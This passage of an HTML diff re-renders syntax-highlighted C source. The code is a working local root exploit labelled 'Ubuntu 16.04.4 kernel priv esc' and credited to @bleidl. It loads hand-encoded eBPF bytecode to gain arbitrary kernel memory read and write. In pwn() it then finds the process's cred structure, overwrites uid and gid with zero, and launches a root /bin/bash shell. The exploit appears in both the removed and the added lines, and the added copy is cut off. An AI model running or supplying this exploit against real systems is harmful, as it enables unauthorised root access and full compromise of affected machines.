-        <span class="p">.</span><span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">value</span><span class="p">,</span>
-        <span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
-    <span class="p">};</span>
-
-    <span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_MAP_UPDATE_ELEM</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
-<span class="p">}</span>
-
-<span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_lookup_elem</span><span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="n">key</span><span class="p">,</span> <span class="kt">void</span> <span class="o">*</span><span class="n">value</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
-        <span class="p">.</span><span class="n">map_fd</span> <span class="o">=</span> <span class="n">mapfd</span><span class="p">,</span>
-        <span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">key</span><span class="p">,</span>
-        <span class="p">.</span><span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">value</span><span class="p">,</span>
-    <span class="p">};</span>
-
-    <span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_MAP_LOOKUP_ELEM</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
-<span class="p">}</span>
-
-<span class="k">static</span> <span class="kt">void</span> <span class="nf">__exit</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">err</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;error: %s</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">err</span><span class="p">);</span>
-    <span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="k">static</span> <span class="kt">void</span> <span class="nf">prep</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">mapfd</span> <span class="o">=</span> <span class="n">bpf_create_map</span><span class="p">(</span><span class="n">BPF_MAP_TYPE_ARRAY</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">int</span><span class="p">),</span> <span class="k">sizeof</span><span class="p">(</span><span class="kt">long</span> <span class="kt">long</span><span class="p">),</span> <span class="mi">3</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">mapfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
-        <span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
-
-    <span class="n">progfd</span> <span class="o">=</span> <span class="n">bpf_prog_load</span><span class="p">(</span><span class="n">BPF_PROG_TYPE_SOCKET_FILTER</span><span class="p">,</span>
-            <span class="p">(</span><span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="p">)</span><span class="n">__prog</span><span class="p">,</span> <span class="n">PROGSIZE</span><span class="p">,</span> <span class="s">&#34;GPL&#34;</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-
-    <span class="k">if</span> <span class="p">(</span><span class="n">progfd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
-        <span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
-
-    <span class="k">if</span><span class="p">(</span><span class="n">socketpair</span><span class="p">(</span><span class="n">AF_UNIX</span><span class="p">,</span> <span class="n">SOCK_DGRAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="n">sockets</span><span class="p">))</span>
-        <span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
-
-    <span class="k">if</span><span class="p">(</span><span class="n">setsockopt</span><span class="p">(</span><span class="n">sockets</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">SOL_SOCKET</span><span class="p">,</span> <span class="n">SO_ATTACH_BPF</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">progfd</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">progfd</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
-        <span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
-<span class="p">}</span>
-
-<span class="k">static</span> <span class="kt">void</span> <span class="nf">writemsg</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
-    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
-
-    <span class="n">ssize_t</span> <span class="n">n</span> <span class="o">=</span> <span class="n">write</span><span class="p">(</span><span class="n">sockets</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">buffer</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">));</span>
-
-    <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">perror</span><span class="p">(</span><span class="s">&#34;write&#34;</span><span class="p">);</span>
-        <span class="k">return</span><span class="p">;</span>
-    <span class="p">}</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">n</span> <span class="o">!=</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">))</span>
-        <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&#34;short write: %lu</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">n</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="cp">#define __update_elem(a, b, c) \
-</span><span class="cp">    bpf_update_elem(0, (a)); \
-</span><span class="cp">    bpf_update_elem(1, (b)); \
-</span><span class="cp">    bpf_update_elem(2, (c)); \
-</span><span class="cp">    writemsg();
-</span><span class="cp"></span>
-<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">get_value</span><span class="p">(</span><span class="kt">int</span> <span class="n">key</span><span class="p">)</span> <span class="p">{</span>
-    <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">;</span>
-
-    <span class="k">if</span> <span class="p">(</span><span class="n">bpf_lookup_elem</span><span class="p">(</span><span class="o">&amp;</span><span class="n">key</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">value</span><span class="p">))</span>
-        <span class="n">__exit</span><span class="p">(</span><span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
-
-    <span class="k">return</span> <span class="n">value</span><span class="p">;</span>
-<span class="p">}</span>
-
-<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">__get_fp</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">__update_elem</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-
-    <span class="k">return</span> <span class="n">get_value</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">__read</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">__update_elem</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
-
-    <span class="k">return</span> <span class="n">get_value</span><span class="p">(</span><span class="mi">2</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="k">static</span> <span class="kt">void</span> <span class="nf">__write</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">val</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">__update_elem</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">addr</span><span class="p">,</span> <span class="n">val</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="k">static</span> <span class="kt">uint64_t</span> <span class="nf">get_sp</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">)</span> <span class="p">{</span>
-    <span class="k">return</span> <span class="n">addr</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mh">0x4000</span> <span class="o">-</span> <span class="mi">1</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="k">static</span> <span class="kt">void</span> <span class="nf">pwn</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span> <span class="p">{</span>
-    <span class="kt">uint64_t</span> <span class="n">fp</span><span class="p">,</span> <span class="n">sp</span><span class="p">,</span> <span class="n">task_struct</span><span class="p">,</span> <span class="n">credptr</span><span class="p">,</span> <span class="n">uidptr</span><span class="p">;</span>
-
-    <span class="n">fp</span> <span class="o">=</span> <span class="n">__get_fp</span><span class="p">();</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">fp</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
-        <span class="n">__exit</span><span class="p">(</span><span class="s">&#34;bogus fp&#34;</span><span class="p">);</span>
-    
-    <span class="n">sp</span> <span class="o">=</span> <span class="n">get_sp</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">sp</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
-        <span class="n">__exit</span><span class="p">(</span><span class="s">&#34;bogus sp&#34;</span><span class="p">);</span>
-    
-    <span class="n">task_struct</span> <span class="o">=</span> <span class="n">__read</span><span class="p">(</span><span class="n">sp</span><span class="p">);</span>
-
-    <span class="k">if</span> <span class="p">(</span><span class="n">task_struct</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
-        <span class="n">__exit</span><span class="p">(</span><span class="s">&#34;bogus task ptr&#34;</span><span class="p">);</span>
-
-    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;task_struct = %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">task_struct</span><span class="p">);</span>
-
-    <span class="n">credptr</span> <span class="o">=</span> <span class="n">__read</span><span class="p">(</span><span class="n">task_struct</span> <span class="o">+</span> <span class="n">CRED_OFFSET</span><span class="p">);</span> <span class="c1">// cred
-</span><span class="c1"></span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">credptr</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
-        <span class="n">__exit</span><span class="p">(</span><span class="s">&#34;bogus cred ptr&#34;</span><span class="p">);</span>
-
-    <span class="n">uidptr</span> <span class="o">=</span> <span class="n">credptr</span> <span class="o">+</span> <span class="n">UID_OFFSET</span><span class="p">;</span> <span class="c1">// uid
-</span><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="n">uidptr</span> <span class="o">&lt;</span> <span class="n">PHYS_OFFSET</span><span class="p">)</span>
-        <span class="n">__exit</span><span class="p">(</span><span class="s">&#34;bogus uid ptr&#34;</span><span class="p">);</span>
-
-    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;uidptr = %lx</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">uidptr</span><span class="p">);</span>
-    <span class="n">__write</span><span class="p">(</span><span class="n">uidptr</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span> <span class="c1">// set both uid and gid to 0
-</span><span class="c1"></span>
-    <span class="k">if</span> <span class="p">(</span><span class="n">getuid</span><span class="p">()</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
-        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;spawning root shell</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
-        <span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/bash&#34;</span><span class="p">);</span>
-        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
-    <span class="p">}</span>
-
-    <span class="n">__exit</span><span class="p">(</span><span class="s">&#34;not vulnerable?&#34;</span><span class="p">);</span>
-<span class="p">}</span>
-
-<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
-    <span class="n">prep</span><span class="p">();</span>
-    <span class="n">pwn</span><span class="p">();</span>
-
-    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cm">/*
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * Ubuntu 16.04.4 kernel priv esc
+</span></span></span><span class="line"><span class="cl"><span class="cm"> *
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * all credits to @bleidl
+</span></span></span><span class="line"><span class="cl"><span class="cm"> * - vnik
+</span></span></span><span class="line"><span class="cl"><span class="cm"> */</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Tested on:
+</span></span></span><span class="line"><span class="cl"><span class="c1">// 4.4.0-116-generic #140-Ubuntu SMP Mon Feb 12 21:23:04 UTC 2018 x86_64
+</span></span></span><span class="line"><span class="cl"><span class="c1">// if different kernel adjust CRED offset + check kernel stack size
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;errno.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;fcntl.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/bpf.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;linux/unistd.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/mman.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/types.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/un.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sys/stat.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="cp">#define PHYS_OFFSET 0xffff880000000000
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define CRED_OFFSET 0x5f8
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define UID_OFFSET 4
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define LOG_BUF_SIZE 65536
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define PROGSIZE 328
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">sockets</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="n">mapfd</span><span class="p">,</span> <span class="n">progfd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="o">*</span><span class="n">__prog</span> <span class="o">=</span>  <span class="s">&#34;</span><span class="se">\xb4\x09\x00\x00\xff\xff\xff\xff</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x55\x09\x02\x00\xff\xff\xff\xff</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\xb7\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x18\x19\x00\x00\x03\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x00\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\xbf\x91\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\xbf\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x07\x02\x00\x00\xfc\xff\xff\xff</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x62\x0a\xfc\xff\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x85\x00\x00\x00\x01\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x55\x00\x01\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x79\x06\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\xbf\x91\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\xbf\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x07\x02\x00\x00\xfc\xff\xff\xff</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x62\x0a\xfc\xff\x01\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x85\x00\x00\x00\x01\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x55\x00\x01\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x79\x07\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\xbf\x91\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\xbf\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x07\x02\x00\x00\xfc\xff\xff\xff</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x62\x0a\xfc\xff\x02\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x85\x00\x00\x00\x01\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x55\x00\x01\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x79\x08\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\xbf\x02\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\xb7\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x55\x06\x03\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x79\x73\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x7b\x32\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x55\x06\x02\x00\x01\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x7b\xa2\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x7b\x87\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span>
+</span></span><span class="line"><span class="cl">        <span class="s">&#34;</span><span class="se">\x95\x00\x00\x00\x00\x00\x00\x00</span><span class="s">&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">char</span> <span class="n">bpf_log_buf</span><span class="p">[</span><span class="n">LOG_BUF_SIZE</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_prog_load</span><span class="p">(</span><span class="k">enum</span> <span class="n">bpf_prog_type</span> <span class="n">prog_type</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">          <span class="k">const</span> <span class="k">struct</span> <span class="n">bpf_insn</span> <span class="o">*</span><span class="n">insns</span><span class="p">,</span> <span class="kt">int</span> <span class="n">prog_len</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">          <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">license</span><span class="p">,</span> <span class="kt">int</span> <span class="n">kern_version</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">prog_type</span> <span class="o">=</span> <span class="n">prog_type</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">insns</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">insns</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">insn_cnt</span> <span class="o">=</span> <span class="n">prog_len</span> <span class="o">/</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">bpf_insn</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">license</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">license</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">log_buf</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="n">bpf_log_buf</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">log_size</span> <span class="o">=</span> <span class="n">LOG_BUF_SIZE</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="mi">1</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">attr</span><span class="p">.</span><span class="n">kern_version</span> <span class="o">=</span> <span class="n">kern_version</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">bpf_log_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_PROG_LOAD</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_create_map</span><span class="p">(</span><span class="k">enum</span> <span class="n">bpf_map_type</span> <span class="n">map_type</span><span class="p">,</span> <span class="kt">int</span> <span class="n">key_size</span><span class="p">,</span> <span class="kt">int</span> <span class="n">value_size</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">           <span class="kt">int</span> <span class="n">max_entries</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">map_type</span> <span class="o">=</span> <span class="n">map_type</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">key_size</span> <span class="o">=</span> <span class="n">key_size</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">value_size</span> <span class="o">=</span> <span class="n">value_size</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">max_entries</span> <span class="o">=</span> <span class="n">max_entries</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span> <span class="n">BPF_MAP_CREATE</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">bpf_update_elem</span><span class="p">(</span><span class="kt">uint64_t</span> <span class="n">key</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">value</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">union</span> <span class="n">bpf_attr</span> <span class="n">attr</span> <span class="o">=</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">map_fd</span> <span class="o">=</span> <span class="n">mapfd</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">key</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">key</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">value</span> <span class="o">=</span> <span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="o">&amp;</span><span class="n">value</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">        <span class="p">.</span><span class="n">flags</span> <span class="o">=</span> <span class="mi">0</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="p">};</span>
+</span></span><span class="line"><span class="cl">
